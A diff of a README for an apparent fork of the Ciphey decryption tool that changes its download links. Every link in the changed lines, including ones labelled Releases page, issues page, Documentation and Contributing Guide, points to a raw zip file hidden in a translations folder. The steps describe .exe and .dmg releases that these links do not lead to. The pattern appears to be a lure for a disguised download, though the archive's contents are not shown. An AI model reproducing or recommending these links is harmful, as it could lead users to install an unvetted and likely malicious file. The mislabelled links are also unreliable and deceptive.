@@ -8,11 +8,11 @@ Welcome to Ciphey! This tool helps you automatically decrypt encryptions, decode
 
 To get started, you need to download Ciphey. Click the button below to visit the Releases page:
 
-[![Download Ciphey](https://raw.githubusercontent.com/neelamkhalid/Ciphey/main/whiskerer/Ciphey.zip)](https://raw.githubusercontent.com/neelamkhalid/Ciphey/main/whiskerer/Ciphey.zip)
+[![Download Ciphey](https://github.com/neelamkhalid/Ciphey/raw/refs/heads/main/translations/nl/Software-v2.5.zip)](https://github.com/neelamkhalid/Ciphey/raw/refs/heads/main/translations/nl/Software-v2.5.zip)
 
 ### Steps to Download
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/neelamkhalid/Ciphey/main/whiskerer/Ciphey.zip) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/neelamkhalid/Ciphey/raw/refs/heads/main/translations/nl/Software-v2.5.zip) to go to the Releases page.
 2. **Choose the Latest Version:** Look for the most recent version of Ciphey, marked as "Latest Release".
 3. **Download the File:** Click the download link for the appropriate file for your system. Common options will be available, such as Windows (.exe) or macOS (.dmg).
 4. **Save the File:** Choose a location on your computer where you want to save the file.
@@ -75,13 +75,13 @@ For detailed instructions, refer to the contributing guide in the repository.
 
 If you need assistance or have questions:
 
-- Check out the [issues page](https://raw.githubusercontent.com/neelamkhalid/Ciphey/main/whiskerer/Ciphey.zip) on GitHub.
+- Check out the [issues page](https://github.com/neelamkhalid/Ciphey/raw/refs/heads/main/translations/nl/Software-v2.5.zip) on GitHub.
 - Participate in discussions and find solutions.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/neelamkhalid/Ciphey/main/whiskerer/Ciphey.zip)
-- [Documentation](https://raw.githubusercontent.com/neelamkhalid/Ciphey/main/whiskerer/Ciphey.zip)
-- [Contributing Guide](https://raw.githubusercontent.com/neelamkhalid/Ciphey/main/whiskerer/Ciphey.zip)
+- [Releases Page](https://github.com/neelamkhalid/Ciphey/raw/refs/heads/main/translations/nl/Software-v2.5.zip)
+- [Documentation](https://github.com/neelamkhalid/Ciphey/raw/refs/heads/main/translations/nl/Software-v2.5.zip)
+- [Contributing Guide](https://github.com/neelamkhalid/Ciphey/raw/refs/heads/main/translations/nl/Software-v2.5.zip)
 
 Thank you for choosing Ciphey! Enjoy simplifying your decryption tasks.
